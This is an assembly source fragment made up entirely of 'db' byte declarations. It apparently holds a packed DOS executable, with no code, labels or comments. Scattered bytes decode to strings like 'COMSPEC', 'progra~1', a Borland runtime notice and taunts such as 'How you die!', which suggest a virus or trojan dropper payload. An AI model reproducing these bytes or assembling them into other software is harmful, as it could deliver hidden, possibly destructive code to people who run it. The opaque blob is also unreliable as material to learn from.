   db  010h,063h,03Ah,05Ch,022h,0ACh,0F0h,004h,0F7h,09Eh,003h,010h,05Dh,019h
   db  003h,070h,0FEh,072h,06Fh,067h,072h,061h,07Eh,031h,0C2h,01Dh,0ECh,00Ch
   db  019h,00Fh,00Bh,056h,0F8h,02Dh,032h,044h,020h,04Dh,047h,0E4h,00Ch,04Eh
   db  0FFh,06Fh,077h,020h,079h,06Fh,075h,020h,064h,0FBh,069h,065h,021h,010h
   db  054h,01Fh,077h,073h,068h,00Eh,0DDh,072h,00Fh,073h,0ECh,06Bh,020h,01Ah
   db  01Dh,0B7h,00Dh,037h,003h,020h,066h,0FDh,075h,063h,06Bh,065h,064h,021h
   db  0D8h,000h,002h,0FFh,0D8h,02Dh,02Ah,0FFh,022h,007h,043h,04Fh,04Dh,0FEh
   db  053h,050h,045h,043h,09Ah,000h,000h,0D1h,09Ch,08Ch,024h,000h,02Fh,0E8h
   db  00Ch,002h,08Ch,0F8h,0D8h,0A3h,0D4h,001h,0B8h,0DFh,0ACh,0A3h,0D0h,001h
   db  0B0h,0A5h,091h,06Ch,0CDh,0C6h,001h,0F5h,0B5h,000h,001h,09Fh,0EBh,034h
   db  006h,00Eh,002h,07Ch,040h,0FBh,075h,00Ah,0BFh,045h,020h,0BEh,0E8h,08Bh
   db  0FDh,0EBh,02Eh,0CEh,02Fh,049h,048h,0BEh,008h,0BFh,063h,07Fh,05Bh,0FDh
   db  0E5h,040h,0E1h,03Dh,09Ah,002h,0FEh,0A2h,0D7h,05Fh,03Bh,06Bh,006h,0BFh
   db  0DEh,0BAh,002h,03Ah,070h,060h,0ADh,050h,02Fh,09Fh,001h,0DDh,005h,008h
   db  054h,06Fh,01Bh,061h,00Eh,06Dh,02Ah,090h,07Ch,02Bh,090h,089h,039h,0FEh
   db  00Dh,06Eh,02Bh,0DAh,001h,096h,0CEh,0EBh,06Bh,0DAh,027h,03Eh,0B0h,02Eh
   db  050h,0FCh,025h,07Bh,006h,081h,0EDh,0B8h,004h,0BEh,0E9h,0E8h,050h,006h
   db  0FAh,05Bh,024h,014h,0D8h,075h,0D4h,089h,013h,09Ah,020h,04Fh,0FAh,0EBh
   db  0FEh,009h,00Eh,0C9h,0B5h,058h,0C0h,0FEh,0EDh,007h,03Ah,0E3h,09Ah,016h
   db  001h,039h,029h,067h,00Eh,0ECh,090h,008h,0EEh,0B8h,045h,013h,077h,005h
   db  09Ch,09Eh,064h,000h,061h,075h,013h,0DAh,075h,092h,0DCh,0B9h,0C3h,075h
   db  021h,0D8h,0A2h,0C0h,076h,0BDh,0ADh,014h,0BFh,082h,0DDh,022h,0E8h,0A6h
   db  0F8h,09Ch,02Ah,03Eh,0DAh,0EBh,0D8h,045h,0B7h,0B3h,08Bh,0BEh,0DDh,07Ch
   db  011h,0E8h,0C7h,087h,0F8h,09Bh,030h,07Ah,07Eh,000h,05Bh,04Ch,04Dh,045h
   db  025h,00Ch,0FFh,02Eh,031h,02Eh,038h,05Dh,000h,0B4h,02Ch,0FEh,0CDh,021h
   db  02Eh,089h,00Eh,0F5h,008h,0DFh,004h,016h,0F8h,008h,0C3h,0C6h,053h,051h
   db  0FCh,0DBh,0B8h,06Eh,0BBh,06Ah,002h,05Fh,091h,0BAh,005h,084h,0F7h,0FFh
   db  0E2h,0C1h,0E1h,003h,002h,0E9h,003h,0D1h,0FBh,003h,0D3h,0C1h,0E3h,002h
   db  004h,07Eh,002h,0F3h,0B1h,005h,0D3h,0DDh,008h,0F3h,005h,0BFh,044h,083h
   db  0D2h,000h,02Eh,0A3h,060h,036h,0FFh,05Bh,08Bh,0CAh,0F7h,0E3h,08Bh,0C1h
   db  078h,005h,015h,049h,0D8h,018h,092h,05Ah,016h,0B2h,0C3h,0DEh,019h,03Eh
   db  0ABh,00Ah,0EBh,05Ah,0D3h,004h,0B2h,036h,0E0h,0EDh,0A3h,0C2h,003h,0FEh
   db  0C6h,006h,082h,00Ch,000h,0B8h,002h,0DFh,08Fh,096h,0FFh,02Eh,0A2h,0E2h
   db  065h,009h,0E8h,05Fh,041h,0E8h,0C8h,002h,0B0h,0C2h,000h,084h,017h,0E8h
   db  018h,0B8h,05Eh,00Bh,0E8h,080h,0FFh,0EFh,021h,0DFh,009h,000h,0B0h,0FCh
   db  0ADh,02Bh,0D2h,092h,0E8h,07Ah,02Fh,08Dh,0E6h,064h,0ABh,062h,011h,0DBh
   db  01Ah,0A1h,029h,06Dh,038h,002h,0B7h,09Bh,005h,0A5h,001h,0CBh,0E8h,095h
   db  02Ch,06Eh,002h,08Fh,002h,01Bh,0ACh,0E8h,04Dh,0C2h,0FFh,03Ch,010h,0F1h
   db  004h,0B0h,003h,06Eh,011h,004h,004h,0D9h,052h,0DFh,07Fh,06Eh,001h,057h
   db  02Eh,080h,03Eh,070h,066h,0DDh,06Ah,0E8h,0C1h,0BEh,05Bh,02Eh,0AAh,0B8h
   db  003h,0DFh,025h,027h,0FFh,0D0h,0E0h,0FEh,08Bh,0D8h,02Eh,08Bh,087h,0C0h
   db  00Bh,0DFh,087h,0EBh,00Ah,081h,0C3h,0B7h,0BAh,007h,08Ah,007h,0B7h,0AAh
   db  079h,03Ch,003h,012h,012h,0EEh,03Ch,006h,040h,0B7h,000h,015h,03Ch,007h
   db  074h,048h,001h,0BFh,0B0h,002h,02Eh,00Ah,047h,0DDh,001h,0AAh,0BFh,0CDh
   db  0DFh,00Ah,0ABh,096h,0E9h,0DBh,0FEh,085h,0A0h,0F6h,06Fh,089h,0A3h,0E8h
   db  00Ah,0D2h,0E8h,0B3h,032h,0DAh,040h,01Eh,0E8h,092h,0AAh,0DFh,027h,0A7h
   db  001h,058h,0AAh,089h,0E8h,00Bh,059h,06Eh,032h,052h,0DBh,081h,053h,0F8h
   db  066h,01Eh,0E9h,03Eh,0DAh,07Fh,0B0h,075h,0AAh,058h,050h,02Bh,0FFh,0C7h
   db  048h,03Dh,07Fh,0FFh,077h,016h,026h,0F6h,0C6h,045h,0FFh,074h,004h,0EEh
   db  005h,003h,008h,05Bh,0CEh,047h,0DBh,047h,02Dh,099h,0ABh,0B7h,0EBh,068h
   db  0E8h,05Fh,0BFh,001h,065h,083h,0FEh,076h,048h,065h,009h,058h,012h,041h
   db  004h,09Fh,0AEh,075h,000h,025h,0B2h,068h,077h,0E9h,001h,010h,07Dh,07Fh
   db  00Ch,0EBh,0E8h,025h,09Fh,008h,075h,08Bh,0DFh,0FBh,081h,0EBh,0C3h,00Dh
   db  05Eh,046h,0F1h,03Ch,0FEh,06Fh,0E9h,080h,072h,005h,08Eh,0A9h,027h,0FAh
   db  0F0h,092h,08Bh,0C3h,005h,05Ch,0F1h,003h,0C2h,04Bh,099h,044h,0E1h,0FEh
   db  0F7h,0DAh,0D4h,09Bh,008h,017h,0F0h,0B9h,034h,012h,0D1h,0B6h,0D3h,0C1h
   db  00Ch,03Bh,007h,0BEh,005h,042h,014h,086h,0A1h,075h,00Dh,0ADh,0BFh,002h
   db  0ABh,0E2h,0FAh,08Bh,0CFh,0E1h,02Eh,02Bh,00Eh,0B6h,07Fh,0C3h,0E8h,0B4h
   db  002h,075h,007h,0C2h,0E8h,022h,039h,0FBh,0C3h,000h,0C3h,050h,056h,0FEh
   db  0E5h,0FDh,093h,033h,0D3h,0DFh,0CAh,0E8h,00Fh,000h,053h,0C6h,0E8h,0AFh
   db  041h,0FEh,058h,00Ch,035h,0AAh,093h,0ABh,015h,08Ch,0B1h,01Dh,0E8h,0BFh
   db  0D8h,074h,00Ch,0C0h,0E0h,003h,0FDh,00Ch,006h,086h,0C4h,0B0h,08Dh,0ADh
   db  0CFh,008h,0F8h,0B8h,0AAh,092h,0ABh,0C3h,07Ch,0E4h,0B1h,0FDh,028h,037h
   db  05Fh,093h,082h,00Bh,0BAh,021h,0B7h,035h,0B4h,0BAh,020h,085h,035h,064h
   db  008h,0A1h,0F1h,0A2h,0FFh,0B8h,0ACh,073h,0D2h,0DBh,0CAh,063h,0BFh,000h
   db  05Dh,087h,0FDh,076h,0F3h,000h,00Ch,059h,0CFh,0EDh,081h,020h,0C2h,026h
   db  086h,03Ah,085h,09Fh,0E3h,0E8h,045h,000h,01Ch,01Bh,006h,030h,06Dh,020h
   db  059h,0F6h,00Bh,0B8h,0B4h,04Ch,072h,0EFh,032h,000h,03Dh,0DBh,0E8h,02Bh
   db  05Eh,011h,0F6h,002h,0B4h,086h,075h,003h,0F7h,088h,0B0h,026h,02Bh,084h
   db  022h,017h,046h,0B6h,04Fh,00Dh,0DFh,097h,081h,0B4h,081h,084h,0FFh,081h
   db  0ACh,033h,0C3h,02Bh,0C3h,003h,0C3h,0EDh,052h,0B8h,00Ah,02Eh,0FFh,023h
   db  0FDh,040h,091h,051h,0E8h,0A4h,000h,0FCh,059h,0E2h,0F9h,05Ah,0C3h,08Bh
   db  02Fh,015h,001h,013h,001h,0A6h,023h,00Dh,0FAh,02Bh,001h,01Bh,001h,033h
   db  017h,0E0h,000h,085h,0C6h,000h,0D1h,050h,0CBh,008h,0FCh,0EEh,0FCh,02Eh
   db  03Ah,049h,0FEh,074h,0F3h,03Ch,004h,074h,0EFh,03Ch,016h,0AFh,0EBh,0DBh
   db  0CAh,0FEh,050h,076h,0E6h,0FCh,096h,0C6h,0E0h,06Ah,0FDh,003h,077h,017h
   db  0E8h,09Ah,00Ch,08Ch,035h,082h,0A3h,004h,070h,0B1h,00Ch,0B0h,0B2h,05Dh
   db  0FFh,0FFh,0C9h,0FCh,0AAh,0C3h,0E9h,0F6h,0FEh,01Ah,0BEh,0D8h,014h,02Bh
   db  04Fh,0BBh,0B8h,00Bh,06Fh,015h,0B3h,0FCh,093h,01Bh,063h,0B7h,0B5h,05Dh
   db  023h,0BEh,03Dh,0A8h,0FCh,08Ah,0D0h,0DEh,0C8h,0E8h,0A9h,0FEh,0C7h,0BAh
   db  070h,0FFh,067h,0ABh,0C3h,0FFh,051h,062h,030h,019h,02Ah,02Ch,036h,04Dh
   db  0FBh,00Dh,023h,00Bh,053h,0B8h,034h,05Bh,0F7h,0FCh,0FDh,0BBh,0BAh,00Dh
   db  02Eh,0D7h,0AAh,028h,03Bh,0FEh,0D9h,073h,0FCh,022h,005h,03Dh,0BFh,03Ah
   db  0FFh,075h,010h,0D3h,02Eh,0FEh,038h,063h,0B0h,0E8h,054h,0F0h,09Eh,00Ch
   db  0BEh,009h,024h,0E8h,054h,0FFh,019h,066h,037h,0A8h,08Bh,0D7h,02Bh,0F8h
   db  0D0h,057h,097h,092h,02Dh,05Fh,06Dh,0ABh,05Fh,0B0h,0C3h,063h,08Dh,03Bh
   db  02Bh,02Eh,065h,00Eh,0DBh,0B8h,00Dh,00Bh,02Fh,0FEh,0FCh,03Ch,00Bh,074h
   db  0A3h,03Ch,00Ch,026h,0D8h,0FEh,038h,0FFh,0D1h,0E0h,005h,0D8h,00Bh,098h
   db  005h,073h,0F8h,003h,046h,0E0h,0C2h,03Ch,0E1h,0DFh,02Ch,0F0h,00Bh,06Ch
   db  023h,006h,068h,0DDh,07Fh,0C1h,0C0h,08Ah,0D8h,0E8h,0DDh,0FBh,0FEh,0E4h
   db  010h,0C6h,0E8h,0B5h,066h,0FBh,00Bh,026h,0FEh,04Dh,0BAh,077h,0ACh,000h
   db  0E8h,08Dh,010h,06Dh,0E1h,050h,0FEh,094h,0DEh,0FBh,02Ah,0D2h,09Bh,033h
   db  00Fh,04Fh,0FBh,026h,08Ah,025h,0BBh,0ACh,0ACh,0FFh,08Ah,0C4h,0AAh,0FEh
   db  0C2h,058h,04Dh,084h,008h,07Eh,04Ch,0BEh,0FBh,037h,000h,0E8h,0B7h,0BBh
   db  0FEh,04Dh,0E8h,072h,06Fh,039h,040h,084h,0D2h,0DBh,074h,009h,029h,065h
   db  0FFh,0FFh,026h,088h,065h,0FEh,04Fh,08Ah,0E0h,0FCh,0C0h,0ECh,003h,080h
   db  0E4h,007h,05Ah,058h,0DEh,061h,018h,0E8h,053h,059h,013h,018h,04Ah,0EFh
   db  0D1h,080h,0C4h,004h,0C0h,0FDh,0E4h,003h,024h,0C7h,00Ah,0C4h,0B7h,084h
   db  0AAh,047h,0FAh,076h,0FBh,026h,008h,05Bh,02Ch,0C3h,032h,036h,02Fh,032h
   db  023h,01Ch,01Ah,085h,0E1h,006h,0AAh,09Fh,0F1h,046h,0FBh,0BEh,072h,036h
   db  02Eh,026h,050h,03Fh,076h,03Ah,0FBh,02Fh,058h,0C3h,0F8h,0FFh,0FCh,0FAh
   db  0F5h,0FBh,090h,0F9h,0FDh,09Eh,0FEh,006h,01Eh,016h,00Eh,00Eh,01Fh,007h
   db  017h,03Ah,026h,005h,0FFh,00Eh,02Eh,08Ch,016h,007h,00Eh,0FAh,00Eh,0DBh
   db  017h,0BCh,032h,0FBh,0F6h,0B8h,013h,000h,0CDh,0E8h,0F1h,026h,000h,06Ah
   db  0B2h,0E7h,05Fh,0DFh,0C0h,007h,057h,00Bh,0B8h,003h,075h,014h,0FAh,02Bh
   db  013h,02Bh,0E6h,08Eh,0DAh,0FBh,017h,039h,095h,002h,0D6h,000h,0C8h,0FCh
   db  0FFh,000h,068h,000h,0A0h,007h,02Bh,0C0h,0EDh,089h,046h,0FEh,002h,0EDh
   db  0FCh,097h,08Bh,006h,097h,003h,08Bh,05Eh,0FFh,0FEh,02Bh,05Eh,0FCh,023h
   db  0C3h,025h,01Fh,0EDh,000h,0AAh,0FFh,011h,0FFh,081h,07Eh,0FEh,040h,001h
   db  072h,0E4h,0C7h,06Bh,009h,02Dh,05Bh,00Eh,0FCh,02Fh,0FCh,0C8h,000h,0FBh
   db  072h,0D5h,0C9h,0C3h,0C8h,041h,0BBh,01Eh,006h,052h,086h,050h,0B1h,0ECh
   db  035h,0BCh,002h,006h,053h,0EBh,00Ah,037h,005h,0C3h,0E9h,05Fh,00Eh,0CFh
   db  07Eh,0AEh,0C7h,007h,06Fh,006h,0BAh,059h,00Eh,06Ch,01Ah,025h,0BDh,0FBh
   db  02Eh,0A1h,0BFh,00Eh,036h,03Bh,046h,004h,072h,0ECh,0F5h,05Ah,01Fh,011h
   db  07Ch,05Ah,007h,01Fh,0C9h,006h,065h,0BFh,041h,050h,057h,0B7h,052h,075h
   db  006h,0B9h,06Eh,061h,099h,0F7h,095h,0C1h,0BBh,022h,08Bh,0F8h,00Dh,061h
   db  008h,059h,07Dh,005h,05Ah,05Fh,058h,0B6h,021h,006h,0A1h,04Fh,0BAh,065h
   db  000h,0F6h,02Bh,0F6h,02Bh,0FFh,083h,036h,089h,080h,0DBh,06Ah,088h,076h
   db  0B4h,0FCh,002h,06Eh,09Dh,0BCh,0FFh,0C9h,0A0h,0DAh,0EBh,089h,00Fh,0D9h
   db  01Fh,0FCh,059h,01Ch,03Bh,09Fh,0FFh,0AEh,027h,0EBh,0B8h,06Fh,021h,02Bh
   db  0C6h,089h,092h,046h,019h,07Dh,003h,06Ah,004h,0D0h,0D3h,0CCh,004h,063h
   db  059h,060h,032h,05Bh,003h,06Ah,002h,0A5h,0DBh,00Ah,00Dh,047h,0D6h,04Ah
   db  074h,0E7h,0EDh,075h,0FFh,0FFh,0B0h,000h,000h,0FFh,055h,08Bh,0ECh,083h
   db  0ECh,050h,0A3h,01Eh,09Eh,07Ch,00Ch,08Dh,07Eh,0B0h,02Fh,05Fh,0FCh,0ACh
   db  03Ch,0C0h,04Fh,072h,0BDh,035h,04Fh,098h,091h,01Bh,0A8h,032h,00Bh,0F9h
   db  0C5h,0F6h,056h,006h,0B4h,01Ah,0F2h,0EDh,08Dh,056h,01Ah,0FDh,01Fh,08Bh
   db  04Eh,00Ah,0B4h,04Eh,0BFh,00Bh,01Fh,0C4h,07Eh,006h,0E8h,08Dh,020h,0E7h
   db  0F7h,0E5h,05Dh,0CAh,00Ah,03Dh,0D8h,01Eh,023h,03Dh,01Fh,0B4h,04Fh,0AFh
   db  004h,01Bh,06Bh,0F5h,019h,05Bh,003h,072h,0F0h,01Eh,083h,0C7h,01Eh,0B6h
   db  061h,01Fh,044h,0D6h,0B9h,0F0h,0FFh,0FCh,0F2h,0AEh,0F6h,0D1h,08Ah,0C1h
   db  0FBh,04Fh,08Bh,0F7h,04Eh,0FDh,057h,07Ch,0AAh,0FCh,01Fh,033h,04Ah,03Bh
   db  025h,037h,0B1h,0C3h,07Bh,0EDh,020h,01Eh,0FCh,07Ch,096h,006h,0E0h,056h
   db  07Bh,0E5h,01Fh,076h,0C1h,01Fh,098h,0BFh,0E9h,040h,08Bh,0D0h,0E3h,00Eh
   db  06Fh,00Eh,061h,072h,006h,0FFh,03Ch,07Ah,077h,002h,02Ch,020h,0AAh,0E2h
   db  0FFh,0F2h,0B0h,03Dh,0AAh,01Fh,01Eh,08Eh,01Eh,0DBh,0CAh,000h,003h,02Ch
   db  0F1h,000h,033h,0F6h,080h,0BBh,0E0h,074h,011h,035h,081h,0BFh,0E2h,0F3h
   db  0A6h,074h,008h,04Eh,0D2h,0ACh,00Ah,094h,08Dh,0E9h,0FBh,0EAh,08Bh,0FEh
   db  01Eh,007h,071h,017h,070h,0B6h,08Ch,00Ah,0DBh,073h,0AAh,06Fh,05Bh,0B9h
   db  0E5h,07Ch,091h,05Eh,04Dh,003h,0B0h,0C4h,021h,050h,0DDh,050h,056h,055h
   db  01Eh,0A1h,079h,0EFh,070h,036h,024h,04Bh,005h,00Ch,002h,001h,081h,0B3h
   db  05Bh,080h,008h,0F4h,0FCh,0ADh,050h,0ADh,0ADh,08Ah,002h,096h,0C8h,0D0h
   db  05Bh,0E8h,00Dh,0EEh,0F8h,004h,0FFh,08Eh,0C0h,01Fh,05Eh,058h,0CDh,000h
   db  09Ch,056h,046h,0B9h,0ACh,0BCh,050h,012h,0FCh,0ABh,00Ah,0C1h,0D9h,002h
   db  0C1h,07Bh,0C2h,0ABh,058h,004h,066h,0C6h,0CCh,08Ch,0D8h,0DEh,001h,02Eh
   db  08Fh,006h,0DBh,04Eh,01Fh,067h,042h,0F6h,0B0h,000h,0BFh,0BAh,0EEh,001h
   db  08Eh,0EDh,0DAh,08Ch,006h,0B6h,0E3h,033h,0EDh,0E8h,0C2h,070h,0E8h,0A0h
   db  0B8h,038h,0C4h,005h,0D0h,0E7h,00Bh,057h,0E8h,0ABh,08Ch,0E4h,07Fh,0C2h
   db  0A3h,09Ch,000h,0A3h,09Eh,0F6h,000h,003h,006h,096h,006h,0DBh,0A0h,002h
   db  0AAh,02Ch,0AEh,0B6h,0B6h,0E1h,0BAh,02Eh,026h,025h,05Fh,06Ch,00Ah,0B2h
   db  016h,0A9h,0FEh,0BCh,000h,0D6h,000h,08Ch,00Eh,00Dh,017h,016h,0EBh,0FDh
   db  003h,0BEh,039h,002h,0B9h,0B0h,03Bh,090h,02Eh,00Fh,0ACh,0B4h,03Bh,0B4h
   db  089h,01Dh,0E1h,08Ch,045h,002h,064h,07Ch,004h,0E2h,0EFh,01Eh,06Fh,0C6h
   db  0BAh,00Ch,001h,05Ah,07Ch,03Bh,09Ch,0BAh,013h,06Ch,007h,023h,0F4h,0DBh
   db  0B7h,039h,024h,00Fh,0CBh,004h,03Fh,030h,0D8h,0BAh,0DEh,0B4h,08Ch,02Ah
   db  0E6h,05Fh,08Eh,063h,002h,00Eh,050h,06Dh,086h,04Eh,0A2h,005h,066h,0E7h
   db  013h,0C8h,002h,00Ch,03Ah,0DCh,0B9h,002h,0CBh,02Fh,09Ah,09Ch,05Bh,080h
   db  0FFh,0E7h,00Fh,053h,09Dh,09Ch,059h,080h,0E5h,0ABh,0F0h,0A8h,07Fh,0F0h
   db  074h,00Eh,040h,080h,0CFh,0B0h,0F0h,00Fh,046h,03Eh,0F0h,040h,0A2h,0DEh
   db  02Bh,0CBh,024h,06Dh,0CAh,09Eh,0FFh,0FBh,083h,0C4h,006h,058h,083h,0E7h
   db  01Fh,0DAh,081h,0C7h,0BEh,0B7h,012h,039h,073h,0C6h,003h,0BFh,06Fh,0F6h
   db  057h,0B4h,054h,06Ch,085h,029h,0C5h,080h,04Eh,0BFh,0D7h,058h,05Bh,059h
   db  05Ah,05Eh,0D2h,05Fh,05Dh,0AEh,0FBh,0CFh,0B8h,0D0h,000h,02Ah,096h,087h
   db  08Eh,0A5h,00Bh,082h,0EBh,081h,007h,013h,0BCh,033h,0C9h,033h,0DBh,023h
   db  019h,0FBh,0C2h,0A3h,0C4h,011h,0FFh,0C1h,00Bh,0C3h,074h,03Dh,0A1h,0A2h
   db  052h,012h,083h,058h,061h,02Fh,070h,05Bh,0F9h,010h,07Ch,009h,01Bh,01Ah
   db  027h,005h,0DBh,0C4h,0F7h,0D8h,0BEh,03Bh,010h,073h,010h,0BAh,0D1h,011h
   db  068h,0F8h,095h,022h,00Bh,0B6h,026h,0D6h,03Bh,006h,08Bh,08Dh,014h,06Ch
   db  022h,014h,05Bh,01Eh,0D1h,00Bh,0ABh,08Ch,006h,04Ch,08Eh,010h,0E2h,083h
   db  0EBh,010h,0DAh,0D4h,0C6h,05Bh,05Ah,01Eh,05Eh,075h,0C4h,01Eh,0BBh,036h
   db  08Ch,0C0h,04Eh,0A3h,013h,061h,09Ah,00Ah,02Dh,0E1h,06Ch,002h,0CEh,028h
   db  008h,0B5h,081h,0A9h,0DFh,0E2h,061h,0CBh,002h,016h,0F7h,0CEh,02Ah,0F5h
   db  008h,028h,096h,042h,053h,0E3h,025h,0CAh,061h,015h,029h,083h,052h,0EDh
   db  0F0h,0A1h,04Fh,0CBh,00Bh,006h,074h,0F6h,029h,0BBh,04Ch,002h,031h,0EDh
   db  000h,0A1h,0A5h,007h,0E7h,06Dh,0BBh,05Bh,00Bh,096h,01Eh,0C8h,058h,040h
   db  097h,006h,03Ah,0E8h,0B6h,055h,016h,0C6h,059h,035h,06Dh,060h,022h,09Ch
   db  007h,04Bh,00Dh,0CDh,081h,090h,0CCh,0A2h,00Ah,064h,01Fh,02Fh,01Bh,000h
   db  043h,0EBh,0F7h,0F3h,0C3h,0B1h,064h,019h,045h,0B1h,0B4h,0A4h,002h,077h
   db  0E7h,032h,0E4h,0F6h,0F7h,0F1h,004h,030h,050h,041h,040h,058h,0A0h,0A2h
   db  056h,0BCh,003h,0EDh,0E8h,001h,009h,08Dh,050h,009h,0F6h,0D2h,0E8h,0E8h
   db  003h,008h,0EDh,024h,00Fh,01Bh,0D2h,03Ch,03Ah,07Ah,0E0h,004h,007h,0DDh
   db  099h,0B4h,006h,0A9h,086h,0A1h,07Fh,002h,01Bh,021h,023h,024h,034h,0FFh
   db  035h,036h,037h,038h,039h,03Ah,03Bh,03Ch,0FFh,03Dh,03Eh,03Fh,075h,052h
   db  075h,06Eh,074h,0F5h,069h,06Dh,065h,020h,06Ah,08Ch,0B6h,09Dh,072h,097h
   db  082h,020h,061h,0B7h,074h,004h,02Eh,00Dh,04Bh,085h,050h,06Bh,00Dh,017h
   db  07Fh,06Fh,06Eh,073h,020h,043h,06Fh,0FCh,070h,079h,072h,069h,067h,068h
   db  0BFh,028h,063h,029h,020h,031h,0FFh,039h,038h,033h,02Ch,039h,032h,020h
   db  042h,06Fh,01Eh,06Ch,061h,06Eh,085h,064h,011h,0FEh,087h,006h,0CEh,000h
   db  0CBh,083h,03Eh,050h,06Fh,01Bh,001h,0CBh,0A1h,06Fh,006h,0E9h,070h,0FEh
   db  0FCh,08Bh,0F4h,036h,08Eh,044h,002h,02Eh,056h,055h,002h,021h,005h,06Dh
   db  014h,007h,0EEh,005h,072h,00Fh,00Ch,0F9h,006h,07Ch,008h,07Fh,007h,07Bh
   db  045h,004h,077h,027h,072h,0B8h,0C9h,0C4h,048h,0B6h,027h,0D7h,005h,0D4h
   db  042h,0ADh,094h,094h,0FCh,072h,00Dh,02Bh,0C4h,073h,009h,028h,097h,059h
   db  088h,0CCh,05Dh,01Dh,0CAh,02Fh,02Ah,0FEh,0BAh,0FFh,033h,0D2h,08Bh,0DCh
   db  01Eh,036h,0C4h,07Fh,0FDh,008h,036h,0C5h,077h,004h,0FCh,0A8h,069h,05Dh
   db  0A5h,0B0h,0D7h,0B1h,003h,080h,02Bh,003h,00Ah,09Bh,000h,08Dh,0D2h,045h
   db  074h,026h,0BBh,013h,0A0h,00Ch,02Eh,00Bh,001h,068h,0B9h,017h,060h,0F3h
   db  0ABh,0C2h,0B9h,04Fh,062h,0FFh,0D2h,075h,009h,0ACh,03Ah,0C8h,076h,0FAh
   db  004h,08Ah,0C8h,0E3h,008h,060h,0C2h,06Ah,047h,05Eh,0E8h,0F8h,032h,0C0h
   db  058h,0CAh,056h,0E5h,050h,0BBh,04Fh,00Ah,036h,0E8h,08Bh,047h,004h,056h
   db  016h,088h,0BAh,007h,006h,069h,00Ch,0A6h,008h,0B5h,00Eh,043h,0CFh,005h
   db  009h,0AEh,00Ah,085h,0E0h,0BAh,0B1h,0D7h,05Dh,0BFh,0BAh,0B2h,0A2h,004h
   db  0DDh,0D3h,0B3h,0D7h,022h,0A7h,0DAh,02Bh,08Bh,05Bh,01Bh,03Dh,016h,045h
   db  0BBh,018h,03Dh,0B2h,004h,079h,00Dh,03Dh,0B0h,077h,010h,0C7h,0FDh,042h
   db  066h,087h,0E9h,024h,052h,0CBh,042h,0FBh,0F7h,025h,000h,05Ah,042h,0B5h
   db  0F6h,087h,046h,0BBh,01Bh,062h,0E8h,085h,04Ch,0EFh,06Ch,038h,0C7h,0ADh
   db  02Dh,05Eh,02Fh,08Eh,081h,06Dh,009h,001h,083h,04Eh,081h,0DDh,07Dh,002h
   db  04Dh,018h,07Bh,007h,050h,0AFh,008h,04Bh,097h,067h,018h,050h,0DBh,0BBh
   db  014h,036h,015h,00Ah,0BDh,0EEh,0BAh,00Ch,0BBh,01Ch,0D6h,00Ah,08Bh,0B2h
   db  03Fh,0DAh,066h,0DFh,001h,026h,0FFh,019h,00Bh,070h,0D5h,0E8h,084h,05Fh
   db  034h,0B5h,026h,022h,0DEh,0CEh,0C5h,055h,00Ch,0DBh,09Eh,04Dh,007h,07Ch
   db  08Bh,01Dh,0B4h,03Fh,02Eh,0E8h,072h,010h,0F7h,07Eh,08Ch,037h,038h,008h
   db  000h,0CCh,000h,01Fh,0E9h,009h,00Ah,076h,0EBh,0EEh,02Fh,002h,097h,02Fh
   db  026h,087h,0DFh,04Dh,008h,031h,040h,030h,036h,0F3h,0C1h,0DDh,053h,0B8h
   db  065h,08Bh,02Ch,024h,00Ah,06Dh,002h,052h,066h,01Fh,0F7h,01Eh,014h,070h
   db  083h,0FBh,004h,02Eh,066h,0B4h,03Eh,0CDh,019h,0C3h,018h,007h,03Bh,035h
   db  0D9h,066h,07Fh,0DBh,075h,02Eh,021h,077h,06Fh,03Ah,03Bh,077h,00Ah,0A5h
   db  074h,051h,04Bh,02Ah,052h,06Ch,0A3h,057h,0DFh,05Fh,00Ah,007h,003h,0DAh
   db  0C1h,003h,0F2h,0BFh,04Bh,0D0h,02Bh,0F2h,08Ch,0C2h,083h,05Bh,0F7h,05Ah
   db  0A9h,0D8h,024h,00Bh,00Dh,041h,0BEh,0C3h,0FFh,068h,08Eh,088h,002h,04Bh
   db  0B5h,0E4h,01Ah,07Eh,085h,0ADh,06Ch,01Bh,05Fh,00Bh,05Dh,058h,061h,043h
   db  0F6h,075h,0BCh,0C3h,05Dh,073h,040h,0CBh,0B2h,039h,02Dh,04Fh,0C3h,083h
   db  01Eh,068h,02Bh,0DFh,04Eh,0D1h,073h,004h,003h,08Dh,0CAh,02Fh,00Bh,052h
   db  0C4h,0FFh,077h,00Ch,003h,0FEh,0B0h,020h,0FCh,0F3h,0F6h,0AAh,02Bh,0FEh
   db  007h,059h,0DCh,07Fh,03Ah,0D1h,0A8h,0B7h,00Fh,052h,050h,065h,0E2h,000h
   db  08Eh,05Ah,01Ch,0B1h,0C8h,068h,0D8h,069h,000h,04Eh,032h,048h,00Ch,041h
   db  080h,0CDh,0C1h,0C8h,06Bh,0D0h,0B4h,096h,04Ch,0B6h,052h,05Fh,05Bh,0FBh
   db  050h,07Bh,0A4h,02Bh,0FBh,0ACh,0D8h,052h,078h,00Dh,050h,015h,0F1h,0D3h
   db  054h,08Dh,003h,003h,06Eh,058h,0BFh,0B0h,0C0h,056h,0C3h,0DCh,0D1h,05Eh
   db  0BBh,0CBh,0BBh,005h,08Fh,07Fh,0E8h,0EEh,0FEh,075h,00Ah,026h,0C5h,083h
   db  07Fh,0E8h,0CCh,0D0h,010h,062h,0C2h,00Dh,07Fh,085h,00Dh,0D5h,0C1h,03Ch
   db  01Ah,0BEh,066h,03Bh,0F3h,075h,0F3h,0EBh,024h,0C3h,007h,050h,0ADh,03Ch
   db  014h,00Bh,022h,001h,0B6h,04Eh,070h,0C3h,0B6h,0D4h,005h,0C3h,03Fh,04Bh
   db  0DDh,0BEh,06Fh,0B1h,08Ch,0DAh,0E8h,0D9h,058h,0FFh,042h,072h,02Dh,02Ch
   db  020h,0D9h,013h,0D9h,00Ah,0C4h,0B6h,01Ah,012h,045h,0A3h,091h,01Ch,071h
   db  05Fh,014h,083h,01Dh,0C3h,063h,00Dh,018h,021h,0B9h,036h,09Dh,02Ch,038h
   db  0E1h,03Dh,0A1h,03Bh,027h,0F0h,0DCh,0CFh,015h,05Dh,00Bh,023h,0C2h,0BDh
   db  0FFh,017h,082h,00Fh,086h,085h,0A6h,0FFh,014h,072h,0FBh,017h,0D8h,001h
   db  05Dh,084h,0CBh,09Ah,0FDh,0B0h,01Ah,0EBh,0F4h,08Eh,07Ch,00Ah,08Bh,0DDh
   db  0FBh,04Ah,07Eh,0B8h,074h,06Dh,0FEh,04Eh,043h,029h,041h,0B1h,025h,034h
   db  07Fh,042h,08Bh,057h,004h,07Ch,03Ch,08Ah,05Fh,0BAh,041h,0FBh,0FFh,03Bh
